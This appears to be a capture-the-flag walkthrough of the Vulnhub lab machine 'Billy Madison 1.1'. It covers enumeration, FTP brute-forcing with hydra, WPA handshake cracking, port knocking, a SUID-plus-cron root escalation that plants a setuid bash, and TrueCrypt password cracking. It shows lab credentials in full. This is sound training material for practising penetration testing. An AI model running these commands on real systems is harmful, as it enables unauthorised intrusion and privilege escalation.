---
title: Billy Madison 1.1
categories: [Vulnhub, Linux]
date: 2022-02-24
tags: [cryptography, wireshark, port-knocking, linux-priv-esc/suid/unknown-exec]
img_path: /Writeups/Vulnhub/Linux/Billy Madison 1.1/images/
image:
  src: Pasted%20image%2020220224023846.png
  width: 1000   # in pixels
  height: 400   # in pixels
---

# Recon
## NMAP Complete Scan
```
┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34]
└─# cat scans/_full_tcp_nmap.txt 
# Nmap 7.92 scan initiated Mon Feb 22 21:34:23 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/vulnHub/Billy_Madison_1.1/192.168.110.34/scans/_full_tcp_nmap.txt -oX /root/vulnHub/Billy_Madison_1.1/192.168.110.34/scans/xml/_full_tcp_nmap.xml 192.168.110.34
adjust_timeouts2: packet supposedly had rtt of -761685 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -761685 microseconds.  Ignoring time.
Nmap scan report for 192.168.110.34
Host is up, received arp-response (0.00042s latency).
Scanned at 2022-02-21 21:34:38 +08 for 179s
Not shown: 65526 filtered tcp ports (no-response)
PORT     STATE  SERVICE     REASON         VERSION
22/tcp   open   tcpwrapped  syn-ack ttl 64
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
23/tcp   open   tcpwrapped  syn-ack ttl 64
69/tcp   open   caldav      syn-ack ttl 64 Radicale calendar and contacts server (Python BaseHTTPServer)
|_http-server-header: MadisonHotelsWordpress
|_http-title: Welcome | Just another WordPress site
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-generator: WordPress 1.0
80/tcp   open   http        syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Oh nooooooo!
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
137/tcp  closed netbios-ns  reset ttl 64
138/tcp  closed netbios-dgm reset ttl 64
139/tcp  open   netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open   netbios-ssn syn-ack ttl 64 Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)
2525/tcp open   smtp        syn-ack ttl 64 SubEtha smtpd
| smtp-commands: BM, 8BITMIME, AUTH LOGIN, Ok
|_ SubEthaSMTP null on BM Topics: HELP HELO RCPT MAIL DATA AUTH EHLO NOOP RSET VRFY QUIT STARTTLS For more info use "HELP <topic>". End of HELP info
MAC Address: 08:00:27:D8:4B:D5 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=2/21%OT=69%CT=137%CU=%PV=Y%DS=1%DC=D%G=N%M=080027%TM=6
OS:21395A1%P=x86_64-pc-linux-gnu)SEQ(SP=FD%GCD=1%ISR=101%TI=Z%CI=I%TS=8)OPS
OS:(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B4ST1
OS:1NW7%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
OS:(R=Y%DF=Y%TG=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%TG=40%S=O%A=S+%F
OS:=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T
OS:5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%TG=40%W=0%S=A%
OS:A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=N)IE(R=N)

Uptime guess: 0.001 days (since Mon Feb 21 21:36:20 2022)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=253 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host: BM

Host script results:
|_clock-skew: mean: 9h59m58s, deviation: 3h27m51s, median: 7h59m57s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 42428/tcp): CLEAN (Timeout)
|   Check 2 (port 15395/tcp): CLEAN (Timeout)
|   Check 3 (port 36534/udp): CLEAN (Timeout)
|   Check 4 (port 64576/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2022-02-21T21:36:58
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.9-Ubuntu)
|   Computer name: bm
|   NetBIOS computer name: BM\x00
|   Domain name: \x00
|   FQDN: bm
|_  System time: 2022-02-21T15:36:56-06:00

TRACEROUTE
HOP RTT     ADDRESS
1   0.42 ms 192.168.110.34

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Feb 21 21:37:37 2022 -- 1 IP address (1 host up) scanned in 194.04 seconds
```

## TCP/80 (HTTP)
### FFUF
```
┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1]
└─# ffuf -u http://$ip/FUZZ -w /usr/share/wordlists/dirb/common.txt -e '.html,.txt,.php,.cgi,.log'

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.110.34/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .html .txt .php .cgi .log 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

index.php               [Status: 200, Size: 937, Words: 96, Lines: 25]
manual                  [Status: 301, Size: 317, Words: 20, Lines: 10]
:: Progress: [27690/27690] :: Job [1/1] :: 460 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```
- `index.php`

## TCP/139,445 (SMB)
### Enum4linux
``` 
 ----------------------------------------
|    Shares via RPC on 192.168.110.34    |
 ----------------------------------------
[*] Enumerating shares
[+] Found 2 share(s):
EricsSecretStuff:
  comment: ''
  type: Disk
IPC$:
  comment: IPC Service (BM)
  type: IPC
[*] Testing share EricsSecretStuff
[+] Mapping: OK, Listing: OK
[*] Testing share IPC$
```
- `EricsSecretStuff`

### Crackmapexec
``` 
┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot]
└─# crackmapexec smb $ip -u ' ' -p ' ' --shares
SMB         192.168.110.34  445    BM               [*] Windows 6.1 (name:BM) (domain:) (signing:False) (SMBv1:True)
SMB         192.168.110.34  445    BM               [+] \ :  
SMB         192.168.110.34  445    BM               [+] Enumerated shares
SMB         192.168.110.34  445    BM               Share           Permissions     Remark
SMB         192.168.110.34  445    BM               -----           -----------     ------
SMB         192.168.110.34  445    BM               EricsSecretStuff READ            
SMB         192.168.110.34  445    BM               IPC$                            IPC Service (BM)

```
-  `EricsSecretStuff` - READ


# Initial Foothold

## TCP/23 (Telnet) - Cryptography
1. Access telnet
	``` 
	┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1]
	└─# nc $ip 23 | tee telnet.txt
	
	***** HAHAH! You're banned for a while, Billy Boy!  By the way, I caught you trying to hack my wifi - but the joke's on you! I don't use ROTten passwords like rkfpuzrahngvat anymore! Madison Hotels is as good as MINE!!!! *****
	```
	- `rkfpuzrahngvat`
	- `ROTten`
		- [ROT](https://en.wikipedia.org/wiki/ROT13) substitution cipher
2. Identify ciphertext
	![](Pasted%20image%2020220221230702.png)
3. Decipher it
	``` 
	┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/exploit]
	└─# echo rkfpuzrahngvat | rot13
	exschmenuating
	```
	- Password/Directory?



## TCP/139,445 (SMB) - Rabbit Hole
1. Download all files from `EricsSecretStuff` fileshare
	``` 
	┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot/smb]
	└─# smbclient //$ip/EricsSecretStuff -c 'prompt;recurse;mget *'
	Enter WORKGROUP\root's password: 
	getting file \._.DS_Store of size 4096 as ._.DS_Store (250.0 KiloBytes/sec) (average 250.0 KiloBytes/sec)
	getting file \ebd.txt of size 35 as ebd.txt (17.1 KiloBytes/sec) (average 224.1 KiloBytes/sec)
	getting file \.DS_Store of size 6148 as .DS_Store (600.4 KiloBytes/sec) (average 358.5 KiloBytes/sec)
	```
2. View files
	![](Pasted%20image%2020220221221922.png)
3. Proceed to `TCP/69`

## TCP/69 (HTTP) - Rabbit Hole
1. Find out the service running @ `TCP/69`
	``` 
	┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot/http]
	└─# nc $ip 69
	test
	<head>
	<title>Error response</title>
	</head>
	<body>
	<h1>Error response</h1>
	<p>Error code 400.
	<p>Message: Bad request syntax ('test').
	<p>Error code explanation: 400 = Bad request syntax or unsupported method.
	</body>
	```
	- HTTP
2. [Fix](https://thegeekpage.com/err-unsafe-port/) `ERR UNSAFE PORT`
3.  FFUF
	``` 
	┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot/http]
	└─# ffuf -u http://$ip:69/FUZZ -w /usr/share/wordlists/dirb/common.txt -e '.txt,.php,.html'

			/'___\  /'___\           /'___\       
		   /\ \__/ /\ \__/  __  __  /\ \__/       
		   \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
			\ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
			 \ \_\   \ \_\  \ \____/  \ \_\       
			  \/_/    \/_/   \/___/    \/_/       

		   v1.3.1 Kali Exclusive <3
	________________________________________________

	 :: Method           : GET
	 :: URL              : http://192.168.110.34:69/FUZZ
	 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
	 :: Extensions       : .txt .php .html 
	 :: Follow redirects : false
	 :: Calibration      : false
	 :: Timeout          : 10
	 :: Threads          : 40
	 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
	________________________________________________
	
	index.php               [Status: 200, Size: 6589, Words: 565, Lines: 133]
	readme.html             [Status: 200, Size: 9231, Words: 995, Lines: 108]
	wp-admin                [Status: 302, Size: 231, Words: 22, Lines: 4]
	wp-login.php            [Status: 200, Size: 2021, Words: 136, Lines: 58]
	xmlrpc.php              [Status: 200, Size: 42, Words: 6, Lines: 1]
	:: Progress: [18460/18460] :: Job [1/1] :: 811 req/sec :: Duration: [0:00:26] :: Errors: 0 
	```
	- Wordpress CMS
5. Enumerate wordpress
	1. Enumerate wordpress version & users
		``` 
		┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot/http]
		└─# wpscan --no-update --disable-tls-checks --url http://$ip:69 -e u -f cli-no-color 2>&1 | tee "/root/vulnHub/Billy_Madison_1.1/192.168.110.34/scans/tcp69/tcp_69_http_wpscan.txt"

		[i] User(s) Identified:

		[+] admin
		 | Found By: Author Posts - Display Name (Passive Detection)
		 | Confirmed By: Author Id Brute Forcing - Display Name (Aggressive Detection)
		```
	2. Enumerate wordpress plugins
		``` 
		┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot/http]
		└─# wpscan --no-update --disable-tls-checks --plugins-detection aggressive --plugins-version-detection aggressive --url http://$ip:69 -e ap -f cli-no-color 2>&1 | tee "/root/vulnHub/Billy_Madison_1.1/192.168.110.34/scans/tcp69/tcp_69_http_wpscan_plugins.txt"

		[i] No plugins Found.
		```
5. Proceed to `exschmenuating`, does not exist
6. `TCP/69` is a rabbithole


## TCP/80 (HTTP) - Directory Enumeration
1. Proceed to `http://192.168.110.34/index.php`
	![](Pasted%20image%2020220221222213.png)
2. Proceed to `exschmenuating`
	![](Pasted%20image%2020220222031420.png)
	- `veronica` is somewhere in the filename 
	- `captured` suggests it is a `.pcap`,`cap`,`.captured` file
	- `veronica` as part of her passwords
3. Create a wordlist (`veronica.txt`) by extracting veronica from `rockyou.txt`
	``` 
	┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/exploit]
	└─# cat /usr/share/wordlists/rockyou.txt | grep veronica > veronica.txt
	```
4. FFUF
	``` 
	┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/exploit]
	└─# ffuf -u http://192.168.110.34/exschmenuating/FUZZ -w veronica.txt -e '.pcap,.cap,.captured,.html,.php'

			/'___\  /'___\           /'___\       
		   /\ \__/ /\ \__/  __  __  /\ \__/       
		   \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
			\ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
			 \ \_\   \ \_\  \ \____/  \ \_\       
			  \/_/    \/_/   \/___/    \/_/       

		   v1.3.1 Kali Exclusive <3
	________________________________________________

	 :: Method           : GET
	 :: URL              : http://192.168.110.34/exschmenuating/FUZZ
	 :: Wordlist         : FUZZ: veronica.txt
	 :: Extensions       : .pcap .cap .captured .html .php 
	 :: Follow redirects : false
	 :: Calibration      : false
	 :: Timeout          : 10
	 :: Threads          : 40
	 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
	________________________________________________
	012987veronica.cap      [Status: 200, Size: 8700, Words: 353, Lines: 193]
	:: Progress: [4638/4638] :: Job [1/1] :: 102 req/sec :: Duration: [0:00:04] :: Errors: 6 ::
	```
	- `012987veronica.cap`

## Wireshark Analysis
1. `012987veronica.cap` captured email conversation between Veronica & Eric. 
3. Mail 2 and 3 contains interesting information
4. View the conversation w/ filter: `tcp.stream eq 0-5`
	- Mail 2:
		``` 
		EHLO kali
		MAIL FROM:<vvaughn@polyfector.edu>
		RCPT TO:<eric@madisonhotels.com>
		DATA
		Date: Sat, 20 Aug 2016 21:57:00 -0500
		To: eric@madisonhotels.com
		From: vvaughn@polyfector.edu
		Subject: test Sat, 20 Aug 2016 21:57:00 -0500
		X-Mailer: swaks v20130209.0 jetmore.org/john/code/swaks/
		RE: VIRUS ALERT!

		Eric,

		Thanks for your message. I tried to download that file but my antivirus blocked it.

		Could you just upload it directly to us via FTP?  We keep FTP turned off unless someone connects with the "Spanish Armada" combo.

		https://www.youtube.com/watch?v=z5YU7JwVy7s

		-VV
		.
		QUIT
		```
		- `Spanish Armada combo`
		- The video contains the port knocking sequence. 
			- From `0:27 - 0:46`
			- `1466, 67, 1469, 1514, 1981, 1986`
	- Mail 3
		``` 
		EHLO kali
		MAIL FROM:<eric@madisonhotels.com>
		RCPT TO:<vvaughn@polyfector.edu>
		DATA
		Date: Sat, 20 Aug 2016 21:57:11 -0500
		To: vvaughn@polyfector.edu
		From: eric@madisonhotels.com
		Subject: test Sat, 20 Aug 2016 21:57:11 -0500
		X-Mailer: swaks v20130209.0 jetmore.org/john/code/swaks/
		RE[2]: VIRUS ALERT!

		Veronica,

		Thanks that will be perfect.  Please set me up an account with username of "eric" and password "ericdoesntdrinkhisownpee."

		-Eric
		.
		QUIT
		```
		- eric:ericdoesntdrinkhisownpee.

## Port Knocking
1. Port Knock
	``` 
	┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/exploit/wireshark]
	└─# knock -v $ip 1466 67 1469 1514 1981 1986
	hitting tcp 192.168.110.34:1466
	hitting tcp 192.168.110.34:67
	hitting tcp 192.168.110.34:1469
	hitting tcp 192.168.110.34:1514
	hitting tcp 192.168.110.34:1981
	hitting tcp 192.168.110.34:1986
	```
2. Check for newly opened ports
	``` 
	┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1]
	└─# nmap $ip -p-
	PORT     STATE  SERVICE
	21/tcp   open   ftp
	22/tcp   open   ssh
	23/tcp   open   telnet
	69/tcp   open   tftp
	80/tcp   open   http
	137/tcp  closed netbios-ns
	138/tcp  closed netbios-dgm
	139/tcp  open   netbios-ssn
	445/tcp  open   microsoft-ds
	2525/tcp open   ms-v-worlds
	MAC Address: 08:00:27:D8:4B:D5 (Oracle VirtualBox virtual NIC)
	```
	- `TCP/21`

## TCP/21 (FTP)
1. Access FTP w/ eric:ericdoesntdrinkhisownpee, check for write access
	``` 
	┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/exploit/wireshark]
	└─# ftp $ip
	Connected to 192.168.110.34.
	220 Welcome to ColoradoFTP - the open source FTP server (www.coldcore.com)
	Name (192.168.110.34:root): eric 
	331 User name okay, need password.
	Password: 
	230 User logged in, proceed.
	Remote system type is UNIX.
	Using binary mode to transfer files.
	ftp> passive
	Passive mode: off; fallback to active mode: off.
	ftp> put test
	local: test remote: test
	200 PORT command successful.
	150 Opening I mode data connection for test.
		 0        0.00 KiB/s 
	226 Transfer completed for "test".
	ftp> dir
	200 PORT command successful.
	150 Opening A mode data connection for /.
	-rwxrwxrwx 1 ftp 1287 Aug 20 12:49 9129
	-rwxrwxrwx 1 ftp 5367 Aug 20 12:49 39772
	-rwxrwxrwx 1 ftp 5208 Aug 20 12:49 39773
	-rwxrwxrwx 1 ftp 6326 Aug 20 12:49 40049
	-rwxrwxrwx 1 ftp 9132 Aug 20 12:49 40054
	-rwxrwxrwx 1 ftp 868 Sep 01 10:42 .notes
	-rwxrwxrwx 1 ftp 0 Feb 21 22:15 test
	226 Transfer completed.
	```
2. Download all files
	``` 
	┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot/ftp]
	└─# wget -m --no-passive ftp://eric:ericdoesntdrinkhisownpee@$ip
	```
3. View the files
	- `.notes`
		![](Pasted%20image%2020220223205335.png)
		- The video contains the blanks
			- From `0:07 - 0:08`
			- "My kid will be a soccer player"
		- WiFi Password from Veronica's FTP folders.

## TCP/2525 (SMTP)
1. Send an email to Eric
	``` 
	┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot/http]
	└─# telnet $ip 2525
	Trying 192.168.110.34...
	Connected to 192.168.110.34.
	Escape character is '^]'.
	220 BM ESMTP SubEthaSMTP null
	MAIL FROM: asdf
	250 Ok
	RCPT TO: eric@madisonhotels.com
	250 Ok
	DATA
	354 End data with <CR><LF>.<CR><LF>
	My kid will be a soccer player
	.
	250 Ok
	QUIT
	221 Bye
	Connection closed by foreign host.
	```
2. Check for newly opened ports
	``` 
	┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot/http]
	└─# nmap $ip -v -p-

	PORT     STATE  SERVICE
	21/tcp   open   ftp
	22/tcp   open   ssh
	23/tcp   open   telnet
	69/tcp   open   tftp
	80/tcp   open   http
	137/tcp  closed netbios-ns
	138/tcp  closed netbios-dgm
	139/tcp  open   netbios-ssn
	445/tcp  open   microsoft-ds
	1974/tcp open   drp
	2525/tcp open   ms-v-worlds
	MAC Address: 08:00:27:D8:4B:D5 (Oracle VirtualBox virtual NIC)
	```
	- `TCP/1974`

## TCP/1974 (SSH)
1. Failed to SSH w/ eric:ericdoesntdrinkhisownpee
2. Earlier, Eric mentioned that we are able to login w/ his WiFi password, and it could be in Veronica's FTP Folder. Veronica is likely to use a password based off her name.

## TCP/21(FTP) - Bruteforce
1. Bruteforce FTP against `veronica.txt` wordlist
	``` 
	┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/exploit]
	└─# hydra -l veronica -P veronica.txt -e nsr ftp://$ip
	Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

	Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-02-23 21:09:24
	[DATA] max 16 tasks per 1 server, overall 16 tasks, 776 login tries (l:1/p:776), ~49 tries per task
	[DATA] attacking ftp://192.168.110.34:21/
	[21][ftp] host: 192.168.110.34   login: veronica   password: babygirl_veronica07@yahoo.com
	1 of 1 target successfully completed, 1 valid password found
	Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-02-23 21:09:43
	```
	- veronica:babygirl_veronica07@yahoo.com
2. Download all files 
	``` 
	┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot/veronica_ftp]
	└─# wget -m --no-passive ftp://veronica:babygirl_veronica07%40yahoo.com@$ip
	```
3. View files
	- `email-from-billy.eml`
	![](Pasted%20image%2020220223214116.png)
	- `eg-01.cap`
		- packet capture file

## Crack .cap file
1. `eg-01.cap` captured WiFi traffic
	``` 
	┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot/veronica_ftp/192.168.110.34]
	└─# tcpdump -r eg-01.cap 
	reading from file eg-01.cap, link-type IEEE802_11 (802.11), snapshot length 65535
	```
	- [`IEEE802_11`](https://www.electronics-notes.com/articles/connectivity/wifi-ieee-802-11/what-is-wifi.php#:~:text=The%20technical%20name%20for%20WiFi,devices%20from%20a%20router%20%2F%20hotspot.&text=Wi-Fi%20wireless%20connectivity%20is%20an%20established%20part%20of%20everyday%20life.)
2. Crack `eg-01.cap` w/ `aircrack-ng`
	``` 
	┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot/veronica_ftp/192.168.110.34]
	└─# aircrack-ng eg-01.cap -w /usr/share/wordlists/rockyou.txt 
	
	                               Aircrack-ng 1.6 

      [00:12:25] 3051073/14344392 keys tested (4151.08 k/s) 

      Time left: 45 minutes, 20 seconds                         21.27%

                           KEY FOUND! [ triscuit* ]


      Master Key     : 9E 8B 4F E6 CC 5E E2 4C 46 84 D2 AF 59 4B 21 6D 
                       B5 3B 52 84 04 9D D8 D8 83 67 AF 43 DC 60 CE 92 

      Transient Key  : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 

      EAPOL HMAC     : 86 63 53 4B 77 52 82 0C 73 4A FA CA 19 79 05 33 

	```
	![](Pasted%20image%2020220223220417.png)
	- eric:triscuit*

## TCP/1974 (SSH)
1. SSH w/ eric:triscuit*
	![](Pasted%20image%2020220223221419.png)
	
	

# Privilege Escalation

## Root - Via SUID Binary
1. Enumerate SUID binaries
	``` 
	eric@BM:/tmp$ find / -perm -4000 2>/dev/null 
	/usr/local/share/sgml/donpcgd
	/usr/bin/sudo
	/usr/bin/pkexec
	/usr/bin/passwd
	/usr/bin/newgidmap
	/usr/bin/chsh
	/usr/bin/gpasswd
	/usr/bin/newuidmap
	/usr/bin/newgrp
	/usr/bin/at
	/usr/bin/chfn
	/usr/bin/ubuntu-core-launcher
	/usr/lib/eject/dmcrypt-get-device
	/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
	/usr/lib/policykit-1/polkit-agent-helper-1
	/usr/lib/openssh/ssh-keysign
	/usr/lib/dbus-1.0/dbus-daemon-launch-helper
	/bin/mount
	/bin/su
	/bin/umount
	/bin/fusermount
	/bin/ping6
	/bin/ping
	/bin/ntfs-3g
	eric@BM:/tmp$ 
	```
	- `/usr/local/share/sgml/donpcgd`, is an unknown binary
2. Execute `/usr/local/share/sgml/donpcgd` to see what it does
	``` 
	eric@BM:/tmp$ /usr/local/share/sgml/donpcgd
	Usage: /usr/local/share/sgml/donpcgd path1 path2
	eric@BM:/tmp$ 
	```
	- Able to specify 2 paths
3. `/usr/local/share/sgml/donpcgd` allows us to create a file that has the same permissions as `path1` anywhere
	- `path1`: file created will have the same permission as the specified file.
	- `path2`: path where you want the file to be created
	- The file created is empty
4. Test our theory
	``` 
	eric@BM:/tmp$ ls -l /etc/passwd
	-rw-r--r-- 1 root root 1717 Aug 20  2016 /etc/passwd # take note of the permission

	eric@BM:/tmp$ /usr/local/share/sgml/donpcgd /etc/passwd /tmp/testing1
	#### mknod(/tmp/testing1,81a4,0)

	eric@BM:/tmp$ ls -la
	total 920
	...
	-rw-r--r--  1 root root      0 Feb 22 02:08 testing1 # same permissions as /etc/passwd
	...
	```
5. Obtain root by creating a writable file at `/etc/cron.hourly`, that will create a root shell.
	``` 
	eric@BM:/tmp$ touch /tmp/test
	eric@BM:/tmp$ /usr/local/share/sgml/donpcgd /tmp/test /etc/cron.hourly/rootbash
	#### mknod(/etc/cron.hourly/rootbash,81b4,0)
	eric@BM:/tmp$  ls -l /etc/cron.hourly
	total 0
	-rw-rw-r-- 1 eric eric 0 Feb 22 04:25 rootbash
	eric@BM:/tmp$ printf '#!/bin/bash\n\ncp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash\n' > /etc/cron.hourly/rootbash; chmod 4777 /etc/cron.hourly/rootbash
	eric@BM:/tmp$ ls -l /etc/cron.hourly
	total 4
	-rwsrwxrwx 1 eric eric 67 Feb 22 04:26 rootbash
	```
	![](Pasted%20image%2020220224020112.png)
6. Wait for cronjob to execute

# /PRIVATE - Crack Truecrypt Volume
1. View files in `/PRIVATE/`
	``` 
	root@BM:/PRIVATE# ls -la
	total 1036
	drwx------  2 root  root     4096 Aug 29  2016 .
	drwxr-xr-x 25 root  root     4096 Feb 22 01:32 ..
	-rw-rw-r--  1 billy billy 1048576 Aug 21  2016 BowelMovement
	-rw-r--r--  1 root  root      221 Aug 29  2016 hint.txt
	root@BM:/PRIVATE# 
	```
2. View files
	- `hint.txt`:
	``` 
	root@BM:/PRIVATE# cat hint.txt 
	Heh, I called the file BowelMovement because it has the same initials as
	Billy Madison.  That truely cracks me up!  LOLOLOL!

	I always forget the password, but it's here:

	https://en.wikipedia.org/wiki/Billy_Madison

	-EG
	root@BM:/PRIVATE# 

	```
		- `That truely cracks me up!`
	- `BowelMovement`
		- Truecrypt volume, based on `hint.txt`, `truely cracks me up!`
3. Create a wordlist from the wikipedia link
	``` 
	┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/exploit]
	└─# cewl https://en.wikipedia.org/wiki/Billy_Madison -w wiki.txt -d 0 -v
	```
4. Crack `BowelMovement` w/ truecrack
	``` 
	┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot]
	└─# truecrack -t BowelMovement -w ../exploit/wiki.txt 
	TrueCrack v3.6
	Website: https://github.com/lvaccaro/truecrack
	Contact us: infotruecrack@gmail.com
	Found password:		"execrable"
	Password length:	"10"
	Total computations:	"744"
	```
5. Download `veracrypt` to mount `BowelMovement`
	1. Download `veracrypt-1.25.9-setup.tar.bz2`
		``` 
		wget https://launchpad.net/veracrypt/trunk/1.25.9/+download/veracrypt-1.25.9-setup.tar.bz2
		```
	2. Extract
		``` 
		tar -xf veracrypt-1.25.9-setup.tar.bz2
		```
	3. Run setup
		``` 
		./veracrypt-1.25.9-setup-console-x64
		```
1. Mount `BowelMovement`
	``` 
	┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot]
	└─# mkdir billy
	┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot]
	└─# veracrypt -tc BowelMovement billy
	Enter password for /root/vulnHub/Billy_Madison_1.1/192.168.110.34/loot/BowelMovement: 
	Enter keyfile [none]: 
	Protect hidden volume (if any)? (y=Yes/n=No) [No]: n
	```
7. View directory structure of `billy` 
	``` 
	┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot]
	└─# tree -a billy/
	billy/
	├── $RECYCLE.BIN
	│   └── desktop.ini
	└── secret.zip

	1 directory, 2 files
	```
8. Unzip `secret.zip`
9. View extracted files
	- `Billy_Madison_12th_Grade_Final_Project.doc`
	![](Pasted%20image%2020220224023455.png)
	- `THE-END.txt`
		``` 
		┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot/billy]
		└─# cat THE-END.txt 
		Congratulations!

		If you're reading this, you win!

		I hope you had fun.  I had an absolute blast putting this together.

		I'd love to have your feedback on the box - or at least know you pwned it!

		Please feel free to shoot me a tweet or email (7ms@7ms.us) and let me know with
		the subject line: "Stop looking at me swan!"

		Thanks much,

		Brian Johnson
		7 Minute Security
		www.7ms.us
		```

